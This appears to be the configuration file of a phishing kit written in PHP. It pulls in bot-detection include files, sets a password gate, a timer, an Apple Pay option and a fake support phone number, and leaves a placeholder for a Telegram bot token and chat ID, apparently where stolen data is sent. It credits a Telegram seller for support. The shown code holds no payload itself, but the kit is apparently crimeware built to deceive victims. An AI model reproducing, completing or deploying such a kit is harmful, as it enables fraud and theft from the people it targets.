<?php

// =====================================
// Includes
// =====================================

// Include custom security and detection files
include_once 'includes/defender.php';
require_once 'includes/detect.php';

// =====================================
// Configuration
// =====================================

// Main site status or message
$main_site = 'Forbidden';
$passwd_status = 'on';
$passwd = 'pwd';
$timer = "8"; 
$apple_pay = "yes";
// Telegram Bot Configuration
// Replace these with your actual bot token and chat ID

// Support Information
// Contact number and link for support
$support_number = "1 (800) 000-1234";
$calling_link = "tel:+18000001234";

// =====================================
// Function Definitions
// =====================================

// Function to get the client's IP address
function _ip() {
    $ipaddress = '';

    // Check various server variables to determine the IP address
    if (getenv('HTTP_CLIENT_IP')) {
        $ipaddress = getenv('HTTP_CLIENT_IP');
    } elseif (getenv('HTTP_X_FORWARDED_FOR')) {
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    } elseif (getenv('HTTP_X_FORWARDED')) {
        $ipaddress = getenv('HTTP_X_FORWARDED');
    } elseif (getenv('HTTP_FORWARDED_FOR')) {
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    } elseif (getenv('HTTP_FORWARDED')) {
        $ipaddress = getenv('HTTP_FORWARDED');
    } elseif (getenv('REMOTE_ADDR')) {
        $ipaddress = getenv('REMOTE_ADDR');
    } else {
        $ipaddress = 'UNKNOWN';
    }

    // Return the determined IP address
    return $ipaddress;
}

// =====================================
// Credits
// =====================================
// Script developed by @C4SHY on Telegram.
// For support or inquiries, please contact: C4SHY@n8.gs

?>